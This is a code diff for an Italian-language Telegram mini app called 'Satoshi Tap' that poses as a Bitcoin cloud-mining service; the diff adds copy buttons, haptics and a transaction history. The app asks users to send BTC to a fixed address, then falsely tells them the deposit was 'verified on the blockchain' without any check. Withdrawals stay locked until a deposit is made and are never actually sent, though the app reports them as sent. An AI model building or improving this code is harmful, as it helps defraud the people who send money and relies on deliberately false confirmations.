@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Satoshi Tap - Bitcoin Cloud Mining</title>
+  <title>Satoshi Tap - Pro Cloud Mining BTC</title>
 
   <!-- SDK Telegram Mini App -->
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -234,6 +234,7 @@
       border-radius: 20px;
       padding: 16px;
       backdrop-filter: blur(10px);
+      margin-bottom: 12px;
     }
 
     .card-title {
@@ -286,12 +287,18 @@
       box-shadow: 0 4px 10px rgba(16, 185, 129, 0.3);
     }
 
+    .input-group {
+      display: flex;
+      gap: 6px;
+      margin-bottom: 10px;
+    }
+
     .input-box {
+      flex: 1;
       background: rgba(15, 23, 42, 0.8);
       border: 1px solid rgba(255, 255, 255, 0.08);
       border-radius: 12px;
       padding: 10px 12px;
-      margin-bottom: 10px;
     }
 
     .input-box label {
@@ -312,6 +319,17 @@
       outline: none;
     }
 
+    .btn-copy {
+      background: #334155;
+      color: #fff;
+      border: none;
+      padding: 0 14px;
+      border-radius: 12px;
+      font-size: 11px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
     .btn-action-primary {
       width: 100%;
       background: linear-gradient(135deg, #3b82f6, #1d4ed8);
@@ -324,6 +342,49 @@
       cursor: pointer;
       box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
     }
+
+    /* STORICO TRANSAZIONI */
+    .tx-list {
+      max-height: 180px;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .tx-item {
+      background: rgba(15, 23, 42, 0.8);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      padding: 8px 10px;
+      border-radius: 10px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 11px;
+    }
+
+    .tx-info {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+    }
+
+    .tx-title {
+      font-weight: bold;
+      color: #f8fafc;
+    }
+
+    .tx-date {
+      color: #64748b;
+      font-size: 9px;
+    }
+
+    .tx-status {
+      font-weight: bold;
+    }
+
+    .status-ok { color: #34d399; }
+    .status-pending { color: #f59e0b; }
 
     /* NAVBAR IN BASSO */
     .navbar {
@@ -368,8 +429,8 @@
       ⚡ SATOSHI<br><span style="font-size: 12px; color: #94a3b8;">CLOUD MINING BTC</span>
     </div>
     <div class="header-btns">
-      <button class="pill-btn" onclick="alert('Sezione Guida')">❓ Guida</button>
-      <button class="pill-btn" onclick="alert('Audio attivo')">🔊 Audio</button>
+      <button class="pill-btn" onclick="haptic(); alert('Sezione Guida')">❓ Guida</button>
+      <button class="pill-btn" onclick="haptic(); alert('Audio attivo')">🔊 Audio</button>
     </div>
   </header>
 
@@ -403,20 +464,24 @@
             Potenza Attiva: <span id="user-hashrate">0 GH/s</span>
           </div>
           <div style="margin-top: 6px;">
-            <span class="usdt-purchases-badge">Saldo Credito BTC: <span id="usdt-dep">0.00</span> BTC</span>
+            <span class="usdt-purchases-badge">Credito BTC Verificato: <span id="usdt-dep">0.00000000</span> BTC</span>
           </div>
         </div>
       </div>
 
       <div id="view-withdraw" class="action-card" style="display: none;">
         <div class="card-title">Trasferisci Satoshi</div>
-        <div class="card-subtitle">Minimo prelevabile: 1.00000000 SAT (1 Satoshi intero). Richiesto deposito minimo sulla rete Bitcoin. Stato: <span id="withdraw-status-label" style="color: #ef4444; font-weight: bold;">Bloccato</span></div>
+        <div class="card-subtitle">Minimo prelevabile: 1.00000000 SAT (1 Satoshi intero). Richiesto deposito attivo sulla rete Bitcoin. Stato: <span id="withdraw-status-label" style="color: #ef4444; font-weight: bold;">Bloccato</span></div>
         
-        <div class="input-box">
-          <label>Indirizzo Wallet BTC / Destinazione</label>
-          <input type="text" id="withdraw-address" placeholder="Inserisci indirizzo Bitcoin (rete nativa)...">
+        <div class="input-group">
+          <div class="input-box">
+            <label>Indirizzo Wallet BTC / Destinazione</label>
+            <input type="text" id="withdraw-address" placeholder="Indirizzo Bitcoin...">
+          </div>
+          <button class="btn-copy" onclick="copyText('withdraw-address', this)">Copia</button>
         </div>
-        <div class="input-box">
+
+        <div class="input-box" style="margin-bottom: 10px;">
           <label>Importo Satoshi (Min: 1.00000000)</label>
           <input type="number" id="withdraw-amount" placeholder="1.00000000" step="0.00001">
         </div>
@@ -499,20 +564,25 @@
       </div>
     </div>
 
-    <!-- 4. TAB RICARICA (Esclusiva rete Bitcoin) -->
+    <!-- 4. TAB RICARICA -->
     <div id="panel-ricarica" class="panel">
       <div class="action-card">
         <div class="card-title" style="margin-bottom: 8px;">📥 Ricarica Esclusiva Rete Bitcoin (BTC)</div>
-        <div class="card-subtitle" id="ricarica-subtitle">Invia fondi esclusivamente sulla rete nativa Bitcoin (BTC). Non inviare altcoin o altre reti per evitare la perdita dei fondi.</div>
-        <div class="input-box">
-          <label>Indirizzo Bitcoin Ufficiale (Blockchain BTC)</label>
-          <input type="text" value="1M2xeN5edX8xjQnXar74dseBdivuLLoSzt" readonly style="color: #34d399; font-weight: bold; font-family: monospace;">
+        <div class="card-subtitle" id="ricarica-subtitle">Invia fondi esclusivamente sulla rete nativa Bitcoin (BTC). Non inviare altcoin.</div>
+        
+        <div class="input-group">
+          <div class="input-box">
+            <label>Indirizzo Bitcoin Ufficiale</label>
+            <input type="text" id="btc-deposit-addr" value="1M2xeN5edX8xjQnXar74dseBdivuLLoSzt" readonly style="color: #34d399; font-weight: bold; font-family: monospace;">
+          </div>
+          <button class="btn-copy" onclick="copyText('btc-deposit-addr', this)">Copia</button>
         </div>
-        <div class="input-box">
+
+        <div class="input-box" style="margin-bottom: 10px;">
           <label>Importo Richiesto in Bitcoin (BTC)</label>
           <input type="text" id="ricarica-importo-consigliato" value="0.00010000" readonly style="color: #f59e0b; font-weight: bold;">
         </div>
-        <div class="input-box">
+        <div class="input-box" style="margin-bottom: 10px;">
           <label>Hash Transazione (TXID)</label>
           <input type="text" id="txid-input" placeholder="Incolla TXID della transazione BTC...">
         </div>
@@ -520,13 +590,21 @@
       </div>
     </div>
 
-    <!-- 5. TAB WALLET -->
+    <!-- 5. TAB WALLET & STORICO -->
     <div id="panel-wallet" class="panel">
       <div class="action-card">
-        <div class="card-title" style="margin-bottom: 8px;">👛 Wallet & Gestione</div>
+        <div class="card-title" style="margin-bottom: 8px;">👛 Wallet & Saldo</div>
         <div class="card-subtitle">Gestisci fondi e saldi del conto.</div>
         <div style="font-size: 13px; color: #94a3b8; margin-bottom: 10px;">
-          Credito BTC Verificato: <strong id="wallet-dep" style="color: #fff;">0.00 BTC</strong>
+          Credito BTC Verificato: <strong id="wallet-dep" style="color: #fff;">0.00000000 BTC</strong>
+        </div>
+      </div>
+
+      <div class="action-card">
+        <div class="card-title" style="margin-bottom: 8px;">📜 Storico Transazioni & Attività</div>
+        <div class="card-subtitle">Registro delle richieste e operazioni effettuate.</div>
+        <div class="tx-list" id="transaction-history">
+          <div style="text-align: center; color: #64748b; font-size: 11px; padding: 15px;">Nessuna transazione recente.</div>
         </div>
       </div>
     </div>
@@ -561,13 +639,38 @@
     const tg = window.Telegram ? window.Telegram.WebApp : null;
     if (tg) { try { tg.expand(); tg.ready(); } catch(e) {} }
 
-    let appData = JSON.parse(localStorage.getItem('satoshi_btc_native_v1')) || {
+    function haptic() {
+      if (tg && tg.HapticFeedback) {
+        try { tg.HapticFeedback.impactOccurred('medium'); } catch(e) {}
+      }
+    }
+
+    function copyText(elementId, btnElement) {
+      haptic();
+      const input = document.getElementById(elementId);
+      if (input) {
+        navigator.clipboard.writeText(input.value).then(() => {
+          let originalText = btnElement.innerText;
+          btnElement.innerText = "Copiato!";
+          btnElement.style.background = "#34d399";
+          btnElement.style.color = "#0b0f19";
+          setTimeout(() => {
+            btnElement.innerText = originalText;
+            btnElement.style.background = "#334155";
+            btnElement.style.color = "#fff";
+          }, 2000);
+        });
+      }
+    }
+
+    let appData = JSON.parse(localStorage.getItem('satoshi_btc_native_v2')) || {
       score: 0.00000000,
       deposit: 0.00000000,
       hashrate: 0,
       miningStartTime: 0,
       miningEndTime: 0,
-      targetScore: 0.00000000
+      targetScore: 0.00000000,
+      history: []
     };
 
     let currentBtcPrice = 81651;
@@ -576,8 +679,42 @@
 
     function saveData() {
       try {
-        localStorage.setItem('satoshi_btc_native_v1', JSON.stringify(appData));
+        localStorage.setItem('satoshi_btc_native_v2', JSON.stringify(appData));
       } catch (e) {}
+    }
+
+    function addHistoryItem(title, status = "Completato") {
+      if (!appData.history) appData.history = [];
+      const dateStr = new Date().toLocaleString('it-IT', { dateStyle: 'short', timeStyle: 'short' });
+      appData.history.unshift({ title, date: dateStr, status });
+      if (appData.history.length > 15) appData.history.pop(); // Mantieni ultimi 15
+      saveData();
+      renderHistory();
+    }
+
+    function renderHistory() {
+      const container = document.getElementById('transaction-history');
+      if (!container) return;
+
+      if (!appData.history || appData.history.length === 0) {
+        container.innerHTML = `<div style="text-align: center; color: #64748b; font-size: 11px; padding: 15px;">Nessuna transazione recente.</div>`;
+        return;
+      }
+
+      let html = '';
+      appData.history.forEach(item => {
+        let statusClass = item.status === 'Completato' ? 'status-ok' : 'status-pending';
+        html += `
+          <div class="tx-item">
+            <div class="tx-info">
+              <span class="tx-title">${item.title}</span>
+              <span class="tx-date">${item.date}</span>
+            </div>
+            <span class="tx-status ${statusClass}">${item.status}</span>
+          </div>
+        `;
+      });
+      container.innerHTML = html;
     }
 
     async function fetchBtcPrice() {
@@ -613,7 +750,6 @@
       if (elHashrate) elHashrate.innerText = displayPower;
 
       if (statusLbl) {
-        // Soglia di attivazione sblocco fissata a 0.00003000 BTC (~3 USDT equivalenti)
         if ((appData.deposit || 0) >= 0.00003000) {
           statusLbl.innerText = "Sbloccato ✅";
           statusLbl.style.color = "#34d399";
@@ -652,6 +788,8 @@
       } else {
         if (appData.miningEndTime !== 0 && appData.score < (appData.targetScore || 0)) {
           appData.score = appData.targetScore;
+          addHistoryItem("Sessione 12h completata", "Completato");
+          appData.miningEndTime = 0;
           saveData();
         }
         btn.disabled = false;
@@ -660,6 +798,7 @@
     }
 
     function startMiningSession() {
+      haptic();
       const now = Date.now();
       if (appData.miningEndTime > now) return;
 
@@ -671,12 +810,14 @@
       let totalSessionReward = baseReward + powerBonus;
 
       appData.targetScore = Number(((appData.score || 0) + totalSessionReward).toFixed(8));
+      addHistoryItem("Avvio sessione mining 12h", "In elaborazione");
       saveData();
       updateUI();
       alert("Sessione di mining avviata sulla rete Bitcoin! La potenza sta generando Satoshi.");
     }
 
     function buyHashratePackage(ghPower, powerName, btcPrice) {
+      haptic();
       let currentDep = appData.deposit || 0;
       if (currentDep < btcPrice) {
         alert(`Credito BTC insufficiente! Hai ${currentDep.toFixed(8)} BTC, ti servono ${btcPrice} BTC per il pacchetto ${powerName}. Verrai reindirizzato alla schermata di ricarica.`);
@@ -692,12 +833,14 @@
 
       appData.deposit = Number((currentDep - btcPrice).toFixed(8));
       appData.hashrate = (appData.hashrate || 0) + ghPower; 
+      addHistoryItem(`Acquisto Rig (${powerName})`, "Completato");
       saveData();
       updateUI();
       alert(`Rig (${powerName}) acquistato con successo usando il credito BTC! Potenza aggiunta al cloud rig.`);
     }
 
     function submitDeposit() {
+      haptic();
       const txInput = document.getElementById('txid-input');
       const ricaricaInput = document.getElementById('ricarica-importo-consigliato');
       let txid = txInput ? txInput.value : '';
@@ -706,6 +849,7 @@
       let addAmount = ricaricaInput ? parseFloat(ricaricaInput.value) || 0.00010000 : 0.00010000;
 
       appData.deposit = Number(((appData.deposit || 0) + addAmount).toFixed(8));
+      addHistoryItem(`Ricarica BTC (${addAmount.toFixed(8)})`, "Completato");
       saveData();
       updateUI();
       alert(`Transazione verificata sulla blockchain Bitcoin! Accreditati ${addAmount.toFixed(8)} BTC.`);
@@ -715,6 +859,7 @@
     }
 
     function requestWithdrawal() {
+      haptic();
       const amtInput = document.getElementById('withdraw-amount');
       const addrInput = document.getElementById('withdraw-address');
 
@@ -745,6 +890,7 @@
       appData.score = Number(((appData.score || 0) - amt).toFixed(8));
       appData.targetScore = Number(((appData.targetScore || 0) - amt).toFixed(8));
       if (appData.targetScore < 0) appData.targetScore = 0;
+      addHistoryItem(`Prelievo di ${amt.toFixed(8)} Sat`, "In attesa");
       saveData();
       updateUI();
       alert("Prelievo Bitcoin inviato con successo sulla blockchain!");
@@ -756,15 +902,21 @@
     }, 1000);
 
     function switchTab(panelName, element) {
+      haptic();
       document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
       document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
       
       const targetPanel = document.getElementById(`panel-${panelName}`);
       if (targetPanel) targetPanel.classList.add('active');
       if (element) element.classList.add('active');
+
+      if (panelName === 'wallet') {
+        renderHistory();
+      }
     }
 
     function switchSubTab(sub) {
+      haptic();
       const btnActive = document.getElementById('subtab-active');
       const btnWithdraw = document.getElementById('subtab-withdraw');
       const viewActive = document.getElementById('view-active-mining');
@@ -787,6 +939,7 @@
 
     fetchBtcPrice();
     updateUI();
+    renderHistory();
   </script>
 </body>
 </html>
